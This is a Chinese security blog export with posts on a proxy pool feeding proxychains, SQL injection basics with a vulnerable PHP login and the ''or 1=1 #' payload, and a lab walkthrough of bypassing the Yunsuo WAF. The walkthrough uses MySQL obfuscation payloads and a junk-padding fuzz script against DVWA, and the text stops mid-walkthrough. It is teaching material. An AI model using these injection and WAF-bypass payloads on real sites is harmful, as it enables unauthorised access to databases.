<p>3、存入数据库的ip每天也要经过测试，存在剔除、评分机制，多次不合格的ip将被删除，每个ip都被评分，我们最终可以按得分排名获得稳定、低响应时间的优质ip。</p>
<p>项目地址：<a href="https://github.com/TideSec/Proxy_Pool">https://github.com/TideSec/Proxy_Pool</a></p>
<p>还有另一个推荐的爬虫代理IP池项目：<a href="https://github.com/jhao104/proxy_pool">https://github.com/jhao104/proxy_pool</a></p>
<h3 id="安装与使用"><a href="#安装与使用" class="headerlink" title="安装与使用"></a>安装与使用</h3><p>1、安装python2依赖库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install lxml</span><br><span class="line">pip install requests</span><br><span class="line">pip install pymysql</span><br></pre></td></tr></table></figure>
<p>2、将源代码从GitHub上下载，把代码放在Web目录下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/TideSec/Proxy_Pool</span><br><span class="line">mv Proxy_Pool /var/html/www/</span><br><span class="line">cd /var/html/www/Proxy_Pool/</span><br><span class="line">vim include/config.inc.php	# 修改配置中的数据库用户名和密码</span><br><span class="line">cd py_proxy_task/</span><br></pre></td></tr></table></figure>
<p>3、开启mysql或mariadb数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service mariadb start</span><br></pre></td></tr></table></figure>
<p>4、修改配置文件py_proxy_task/config.py（修改数据库用户名、密码）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim config.py</span><br></pre></td></tr></table></figure>
<p>5、使用python2运行proxy_get.py爬取代理IP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 proxy_get.py</span><br></pre></td></tr></table></figure>
<p>6、使用python2运行proxy_check.py查看代理IP的存活情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 proxy_check.py</span><br></pre></td></tr></table></figure>
<p>7、访问站点</p>
<p><img src="https://i.loli.net/2021/10/05/Gbka1vNJfAnYlqc.png" alt="09d2f1b47ee8e924662b4f4c8118549c.png"></p>
<p>8、Web接口</p>
<p><img src="https://i.loli.net/2021/10/05/RhXt4ZGwEPyQMzp.png" alt="e1d2fce67714788f2e78be5ceb0402a9.png"></p>
<h3 id="将代理池IP自动添加入proxychains配置"><a href="#将代理池IP自动添加入proxychains配置" class="headerlink" title="将代理池IP自动添加入proxychains配置"></a>将代理池IP自动添加入proxychains配置</h3><p>远程添加可以使用Web接口，这里就不使用Web接口了，直接利用数据库中的数据进行添加。</p>
<p>记得提前备份好配置文件。</p>
<p>不多说直接上代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="keyword">import</span> re,time</span><br><span class="line"></span><br><span class="line">db_host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">db_user = <span class="string">&quot;root&quot;</span></span><br><span class="line">db_pass = <span class="string">&quot;123456&quot;</span></span><br><span class="line">db_name = <span class="string">&quot;proxy&quot;</span></span><br><span class="line">filename = <span class="string">&quot;/etc/proxychains4.conf&quot;</span></span><br><span class="line"></span><br><span class="line">ips = []</span><br><span class="line">ports = []</span><br><span class="line">results = []</span><br><span class="line"></span><br><span class="line">conn = pymysql.connect(</span><br><span class="line">        host=db_host,</span><br><span class="line">        user=db_user,</span><br><span class="line">        password=db_pass,</span><br><span class="line">        database=db_name,</span><br><span class="line">        charset=<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line"></span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">sql = <span class="string">&quot;SELECT content FROM valid_ip&quot;</span></span><br><span class="line">cursor.execute(sql)</span><br><span class="line">results = cursor.fetchall()</span><br><span class="line">cursor.close()</span><br><span class="line">conn.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">    ips.append(re.findall(<span class="string">r&#x27;\d+.\d+.\d+.\d+&#x27;</span>,result[<span class="number">0</span>])[<span class="number">0</span>])</span><br><span class="line">    ports.append(re.findall(<span class="string">r&#x27;(?&lt;=:)\d+&#x27;</span>,result[<span class="number">0</span>])[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;random_chain\nproxy_dns\nremote_dns_subnet 224\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n\n[ProxyList]\n&quot;</span>)</span><br><span class="line">    f.close()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(ips)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--&gt; IP: &quot;</span>,ips[i],<span class="string">&quot;  PORT: &quot;</span>,ports[i],<span class="string">&quot; &lt;--&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span> (filename,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;http  %s  %s\n&quot;</span> %(ips[i],ports[i]))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>不过这个代理池很多ip都用不了。</p>
<p>让我们再对脚本做亿点点优化，增加了对端口的存活验证</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql,socket,threading</span><br><span class="line"><span class="keyword">import</span> re,time,nmap</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> f</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetProxy</span>:</span></span><br><span class="line">    db_host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    db_user = <span class="string">&quot;root&quot;</span></span><br><span class="line">    db_pass = <span class="string">&quot;1231414514&quot;</span></span><br><span class="line">    db_name = <span class="string">&quot;proxy&quot;</span></span><br><span class="line">    filename = <span class="string">&quot;/etc/proxychains4.conf&quot;</span></span><br><span class="line">    ips = []</span><br><span class="line">    ports = []</span><br><span class="line">    nm = nmap.PortScanner()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_port</span>(<span class="params">self,ip,port</span>):</span></span><br><span class="line">        <span class="comment">#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></span><br><span class="line">        <span class="comment">#sock.settimeout(5)</span></span><br><span class="line">        <span class="comment">#result = sock.connect_ex((ip,port))</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.nm.scan(ip,port)</span><br><span class="line">            result = self.nm[ip][<span class="string">&#x27;tcp&#x27;</span>][<span class="built_in">int</span>(port)][<span class="string">&#x27;state&#x27;</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> result==<span class="string">&#x27;open&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;--&gt; IP: &quot;</span>,ip,<span class="string">&quot;  PORT: &quot;</span>,port,<span class="string">&quot; &lt;--&quot;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(self.filename, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(<span class="string">&quot;http  %s  %s\n&quot;</span> % (ip, port))</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_sql</span>(<span class="params">self</span>):</span></span><br><span class="line">        conn = pymysql.connect(</span><br><span class="line">                host=self.db_host,</span><br><span class="line">                user=self.db_user,</span><br><span class="line">                password=self.db_pass,</span><br><span class="line">                database=self.db_name,</span><br><span class="line">                charset=<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line"></span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        sql = <span class="string">&quot;SELECT content FROM valid_ip&quot;</span></span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">        self.results = cursor.fetchall()</span><br><span class="line">        cursor.close()</span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_result</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> self.results:</span><br><span class="line">            self.ips.append(re.findall(<span class="string">r&#x27;\d+.\d+.\d+.\d+&#x27;</span>,result[<span class="number">0</span>])[<span class="number">0</span>])</span><br><span class="line">            self.ports.append(re.findall(<span class="string">r&#x27;(?&lt;=:)\d+&#x27;</span>,result[<span class="number">0</span>])[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span> (self.filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">&quot;random_chain\nproxy_dns\nremote_dns_subnet 224\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n\n[ProxyList]\n&quot;</span>)</span><br><span class="line">                f.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">multi_thread</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.threads = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(self.ips)):</span><br><span class="line">            self.threads.append(</span><br><span class="line">                threading.Thread(target=GetProxy.check_port, args=(self, self.ips[i],self.ports[i],))</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">for</span> thread <span class="keyword">in</span> self.threads:</span><br><span class="line">            thread.start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> thread <span class="keyword">in</span> self.threads:</span><br><span class="line">            thread.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    proxy = GetProxy()</span><br><span class="line">    proxy.get_sql()</span><br><span class="line">    proxy.get_result()</span><br><span class="line">    proxy.multi_thread()</span><br></pre></td></tr></table></figure>
<p>虽然筛选掉了大部分未存活的主机，但是还是有很多代理连接超时。</p>
<p>总结：天底下没有免费的午餐，免费的不一定就好。有能力的还是选择使用付费代理吧。</p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>漏洞扫描</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入的原理</title>
    <url>/post/1f3ac757.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="SQL注入漏洞介绍"><a href="#SQL注入漏洞介绍" class="headerlink" title="SQL注入漏洞介绍"></a>SQL注入漏洞介绍</h2><p>在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是SQL注入漏洞。</p>
<p>SQL 注入式攻击技术,一般针对基于 Web 平台的应用程序造成 SQL 注入攻击漏洞的原因，<strong>是由于程序员在编写 Web 程序时，没有对浏览器端提交的参数进行严格的过滤和判断。用户可以修改构造参数，提交 SQL 查询语句，并传递至服务器端，从而获取想要的敏感信息，甚至执行危险的代码或系统命令。</strong></p>
<p>虽然 SQL 注入攻击技术早已出现,但是时至今日仍然有很大一部分网站存在 SQL 注入漏洞，在本章开篇中进行的入侵检测中就发现了各大门户网站同样存在SQL 注入漏洞,更别说一些小网站了。由于 SQL 漏润存在的普遍性，因此 SQL 入侵攻击技术往往成为黑客入侵攻击网站渗透内部服务的首选技术,其危害性非常大。</p>
<p>下面对目前的各种流行 SQL 注入攻击技术进行总结,以便网络安全管理人员和工作者更加深入地了解这种攻击与防御方法。</p>
<h2 id="注入式攻击的原理"><a href="#注入式攻击的原理" class="headerlink" title="注入式攻击的原理"></a>注入式攻击的原理</h2><p>注入式攻击的根源在于，程序命令和用户数据（即用户输入）之间没有做到泾渭分明。这使得攻击者有机会将程序命令当作用户输入的数据提交给 Web 程序，以发号施令，为所欲为（注：注入最终是数据库，与脚本、平台无关）。</p>
<p>总之一句话：注入产生的原因是接受相关参数未经处理直接带入数据库查询操作。</p>
<p>为了发动注入攻击，攻击者需要在常规输入中混入将被解释为命令的“数据”，想要成功，必须要做三件事情：</p>
<ul>
<li><strong>确定Web应用程序所使用的技术</strong></li>
</ul>
<p>注入式攻击对程序设计语言或者硬件关系密切,但是这些可以通过适当的踩点或者索性将所有常见的注入式攻击都搬出来逐个试一下就知道了。为了确定所采用的技术,攻击者可以考察 Web 页面的页脚,查看错误页面,检查页面源代码,或者使用诸如 Nessus、AWVS、APPSCAN 等工具来进行刺探。</p>
<ul>
<li><strong>确定所有可能的输入方式</strong></li>
</ul>
<p>Web 应用的用户输入方式比较多,其中一些用户输入方式是很明显的,如 HTML 表单；另外,攻击者可以通过隐藏的 HTML 表单输入、HTTP 头部、cookies、甚至对用户不可见的后端 AJAX 请求来跟 Web 应用进行交互。一般来说，所有 HTTP 的 GET 和 POST 都应当作用户输入。为了找出一个 Web 应用所有可能的用户输入，我们可以求助于 Web 代理，如 Burp 等。</p>
<ul>
<li><strong>查找可用于注入的用户输入</strong></li>
</ul>
<p>在找出所有用户输入方式后,就要对这些输入方式进行筛选,找出其中可以注入命令的那些输入方式。这个任务好像有点难，但是这里有一个小窍门，那就是多多留意 Web 应用的错误页面，很多时候您能从这里得到意想不到的收获。</p>
<h2 id="万能密码漏洞解析"><a href="#万能密码漏洞解析" class="headerlink" title="万能密码漏洞解析"></a>万能密码漏洞解析</h2><p>大家经常听到网站万能密码登录,今天我们就来分析分析万能密码是怎么回事。先给大家来一个简单的实例：</p>
<ol>
<li>登录页面关键代码如下：</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="variable">$adminname</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;adminname&#x27;</span>];</span><br><span class="line"><span class="variable">$adminpass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;adminpass&#x27;</span>];</span><br><span class="line"><span class="variable">$adminpass</span> .= <span class="string">&quot;Axphp.com&quot;</span>;</span><br><span class="line"><span class="variable">$adminpass</span> = md5(<span class="variable">$adminpass</span>);</span><br><span class="line"><span class="variable">$adminsql</span> = <span class="string">&quot;select * from axphp_admin where adminname=&#x27;<span class="subst">$adminname</span>&#x27; and adminpass=&#x27;<span class="subst">$adminpass</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$adminery</span> = mysql_query(<span class="variable">$adminsql</span>, <span class="variable">$config</span>);</span><br><span class="line"><span class="variable">$adminnum</span> = mysql_num_rows(<span class="variable">$adminery</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$adminnum</span> == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">    setcookie(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;Y&quot;</span>, time() + <span class="number">3600</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    setcookie(<span class="string">&quot;admin_name&quot;</span>, <span class="variable">$adminname</span>, time() + <span class="number">3600</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    header(<span class="string">&quot;location:axadmin.php&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&quot;location:axphp.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$adminsql <span class="operator">=</span> &quot;select * from axphp_admin where adminname=&#x27;$adminname&#x27; and adminpass=&#x27;$adminpass&#x27;&quot;;</span><br></pre></td></tr></table></figure>
<p>我们发现没有做任何过滤直接拿前端传入的数据,这样拼接的 SQL 会存在注入漏洞。</p>
<p>1）先输入正常数据（账号admin，密码admin），效果如下：</p>
<p><img src="https://i.loli.net/2021/10/05/rz8BKu5P3csCfGJ.png" alt="733007d88171f2ead549ef362c4941c1.png"></p>
<p><img src="https://i.loli.net/2021/10/05/ZRztfBH5V8OgvyQ.png" alt="150e121789c8e535341bbb3cbbd9f2e0.png"></p>
<p>查询的SQL语句为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span> axphp_admin where adminname=<span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> adminpass=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
<p>2）输入注入数据：</p>
<p>如图,即用户名为:用户名：’or 1=1 #,密码可随便输入</p>
<p><img src="https://i.loli.net/2021/10/05/EgsRKT8IBY7QjVC.png" alt="dee795e02a077323b41c4a6a81645357.png"></p>
<p><img src="https://i.loli.net/2021/10/05/eNRdZqT8oA6hzvK.png" alt="85fdeb8d3c5fa55984f84efcbe73101f.png"></p>
<p>查询的SQL语句为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> axphp_admin <span class="keyword">where</span> adminname<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #<span class="string">&#x27; and adminpass=&#x27;</span>aaa<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
<ol>
<li>现在我们来分析一下：’ or 1=1 # 为什么能登录系统，原因如下：</li>
</ol>
<p>1） <code>select * from axphp_admin where adminname=&#39;&#39;or 1=1</code> 首先看这条查询语句,查询所有来自<code>axphp_admin</code> 表的数据, 条件 name 为空或者 1=1，这两个条件只要一个满足就为真，<code>adminname=&#39;&#39;or 1=1</code>现在 1=1 就是真而且是是没任何作用的真,那么最终数据库执行的语句相当于 <code>select * from axphp_admin</code></p>
<p>2）因为<code>adminname</code>值中输入了“#”注释符，后面语句被省略而登录成功。(常用的注释手法：“#”与“—+”）</p>
<p>3）不同的程序万能密码也是不一样的，如 ASP 的万能密码是<code>&#39;or&#39;=&#39;or&#39;</code>，PHP的万能密码是<code>&#39;or 1=1 #</code></p>
<h2 id="手工检测SQL注入点"><a href="#手工检测SQL注入点" class="headerlink" title="手工检测SQL注入点"></a>手工检测SQL注入点</h2><p>最常用的 SQL 注入点判断方法,是在网站中寻找如下形式的网页链接。</p>
<p><a href="http://www.abc.com/sss.asp?id=xx">http://www.abc.com/sss.asp?id=xx</a> （ASP）</p>
<p><a href="http://www.abc.com/sss.php?id=xx">http://www.abc.com/sss.php?id=xx</a> （PHP）</p>
<p><a href="http://www.abc.com/sss.jsp?id=xx">http://www.abc.com/sss.jsp?id=xx</a> （JSP）</p>
<p><a href="http://www.abc.com/sss.aspx?id=xx">http://www.abc.com/sss.aspx?id=xx</a> （ASPX）</p>
<p><a href="http://www.abc.com/sss/new/id/8">http://www.abc.com/sss/new/id/8</a> （伪静态）</p>
<p><a href="http://www.abc.com/sss/new/php-8.html">http://www.abc.com/sss/new/php-8.html</a> （伪静态）</p>
<p>其中的“xx”可能是数字,也有可能是字符串,分别被称为整数类型数据和字符型数据。</p>
<p>如何判断某个网页链接是否存在 SQL 注入漏洞呢?通常有两种检测方法。</p>
<ol>
<li><strong>“单引号”法</strong></li>
</ol>
<p>第一种检测 SQL 注入漏洞是否存在的方法是“单引号”法。方法很简单,直接在浏览器地址栏中的网址链接后加上一个单引号，如果页面不能正常显示，浏览器返回一些异常信息，则说明该链接可能存在注入漏洞。</p>
<ol>
<li><strong>“1=1 和 1=2” 法</strong></li>
</ol>
<p>很多时候检测提交包含引号的链接时，会提示非法字符，或者直接不返回任何信息，但这并不等于不存在 SQL 注入漏洞。此时可使用经典的“1=1 和 1=2”法进行检测。方法很简单，就是直接在链接地址后分别加上 and 1=1 和 and 1=2 进行提交，如果返回不同的页面，那么说明存在 SQL 注入漏洞。</p>
<h2 id="SQL注入的防护方式"><a href="#SQL注入的防护方式" class="headerlink" title="SQL注入的防护方式"></a>SQL注入的防护方式</h2><ol>
<li><p>永远不要信任客户端提交的数据，一定要对客户端提交的数据进行校验，校验可以考虑数据类型，字符长度或者正则表达式等方式。</p>
</li>
<li><p>对客户端提交的数据进行转义，例如将” ‘ “转义为” ‘ “。</p>
</li>
<li><p>采用预编译绑定变量的SQL语句而不是直接拼接SQL语句。</p>
</li>
<li><p>避免在生产环境中，直接输出错误信息，因为这些错误信息有可能被攻击者利用。</p>
</li>
<li><p>严格执行数据库账号权限管理。</p>
</li>
<li><p>对用户敏感信息特别是密码做严格加密处理。</p>
</li>
</ol>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>《Web入侵先遣—SQL注入攻击技术初探 》</li>
<li><a href="https://www.jianshu.com/p/42fbb8066704">OWASP TOP10之sql注入简述 - 简书 (jianshu.com)</a></li>
<li><a href="https://blog.csdn.net/ski_12/article/details/78299460">PHP代码审计实战之盾灵CMS_Mi1k7ea-CSDN博客</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>WAF-Bypass之SQL注入绕过云锁</title>
    <url>/post/e2e31796.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Bypass云锁MySQL注入"><a href="#Bypass云锁MySQL注入" class="headerlink" title="Bypass云锁MySQL注入"></a>Bypass云锁MySQL注入</h2><h3 id="MySQL特性"><a href="#MySQL特性" class="headerlink" title="MySQL特性"></a>MySQL特性</h3><p><strong>空格可以由其它字符替代</strong></p>
<blockquote>
<p>select id,contents,time from news where news_id=1<span style="color:red">①</span>union<span style="color:red">②</span>select<span style="color:red">③</span>1,2,username<span style="color:red">④</span>from<span style="color:red">⑤</span>admin</p>
</blockquote>
<ul>
<li><p>位置①</p>
<ul>
<li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
<li>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</li>
<li>可以利用数学运算以及数据类型：news_id=1.0，news_id=1E0，news_id=\N</li>
</ul>
</li>
<li><p>位置②</p>
<ul>
<li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
<li>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</li>
<li>可以利用括号：union(select 1,2)</li>
</ul>
</li>
<li><p>位置③</p>
<ul>
<li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
<li>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</li>
<li>可以利用其它符号：+ 、- 、 ~ 、!、@</li>
</ul>
</li>
<li><p>位置④</p>
<ul>
<li><p>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</p>
</li>
<li><p>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</p>
</li>
<li><p>大括号{}：union select {``1},{x 2}</p>
</li>
<li><p>可利用数学运算以及数据类型：</p>
<blockquote>
<p>union select usename,2.0from admin<br>union select username,8e0from admin<br>union select username,\Nfrom admin</p>
</blockquote>
</li>
</ul>
</li>
<li><p>位置⑤</p>
<ul>
<li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
<li>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</li>
<li>反引号`：union select 1,table_name,3  from`information_schema`.`tables`limit 0,1%23</li>
<li>内联注释：union select 1,table_name,3  from /*!50001information_schema.tables*/ limit 0,1%23</li>
<li>大括号{}：union select 1,table_name,3  from{x information_schema.tables}limit 0,1%23</li>
<li>小括号()：union select 1,table_name,3  from(information_schema.tables)limit 0,1%23</li>
</ul>
</li>
</ul>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>靶场：DVWA（low级别）</p>
<p>数据库：MySQL 5.5</p>
<p>Web脚本：PHP 5.4.19</p>
<p>WAF：云锁-win_3.1.20.24</p>
<p><img src="https://i.loli.net/2021/10/21/xQ1NV9hEoyG3f6J.png" alt="image-20211021194906761"></p>
<h3 id="超大数据包绕过"><a href="#超大数据包绕过" class="headerlink" title="超大数据包绕过"></a>超大数据包绕过</h3><h4 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h4><p><strong>资源限制：WAF长度资源限制</strong></p>
<p>假如HTTP请求POST BODY太大，检测所有内容，WAF集群消耗太多的CPU、内存资源。因此许多WAF只检测前面的2M或4M的内容。对于攻击者而言，只需要在POST BODY前面添加许多无用的数据，把攻击的payload放在最后即可绕过WAF检测。</p>
<h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>首先使用BurpSuite抓取数据包，并记下数据包的Header信息</p>
<p><img src="https://i.loli.net/2021/10/21/nM3LzOrqNb5P6QI.png" alt="image-20211021202615408"></p>
<p>编写好我们的Python脚本进行FUZZ：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># _*_  coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">headers=&#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0&quot;</span>,<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;security_session_verify=8e11e7d561e260e3a97a6b1dc9da173b; PHPSESSID=8d2qf26p3tarqosghic3ol6j22; security=low;&quot;</span>&#125;</span><br><span class="line">url=<span class="string">&quot;http://hackrock.com:812/vulnerabilities/sqli/?Submit=Submit&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_random_str</span>(<span class="params">randomlength=<span class="number">16</span></span>):</span></span><br><span class="line">    random_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    base_str = <span class="string">&#x27;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line">    length = <span class="built_in">len</span>(base_str) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(randomlength):</span><br><span class="line">        random_str += base_str[random.randint(<span class="number">0</span>, length)]</span><br><span class="line">    <span class="keyword">return</span> random_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>,<span class="number">50000</span>,<span class="number">100</span>):</span><br><span class="line">    payload = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&quot;1&#x27;union-- &quot;</span>+generate_random_str(i)+<span class="string">&quot;\r\nselect 1,2#&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response=requests.post(url=url,headers=headers,data=payload,timeout=<span class="number">0.5</span>)</span><br><span class="line">        result = response.content</span><br><span class="line">        <span class="built_in">print</span> result</span><br><span class="line">        <span class="comment">#print result</span></span><br><span class="line">        <span class="keyword">if</span> result.count(<span class="string">&#x27;union&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Length is : %s &quot;</span> % <span class="built_in">str</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;.&quot;</span></span><br></pre></td></tr></table></figure>
<p>这个脚本的作用是生成脏数据进行POST传参，最后返回FUZZ之后的响应内容与脏数据的长度</p>
<p>执行脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pyhton2 fuzz.py</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/21/PqeY9RB1GWO8c6Z.png" alt="image-20211021203728294"></p>
<p>将返回的内容粘贴至BurpSuite</p>
<p>从响应内容可以看出，我们构造好的脏数据已经成功绕过了WAF</p>
<p><img src="https://i.loli.net/2021/10/21/G3UwxdTEoLbWjki.png" alt="image-20211021203938510"></p>
<p>然而又有一个问题，当我们想要查询数据时，仍然被WAF拦截</p>
<p><img src="https://i.loli.net/2021/10/21/4m5f1duJFgK7vOV.png" alt="image-20211021204135467"></p>
<p>这是因为云锁对<code>select+关键信息</code>做了规则匹配</p>
<p>这时我们可以使用多行注释符<code>/**/</code>加脏数据的方法去绕过WAF</p>
<p>构造数据包：</p>
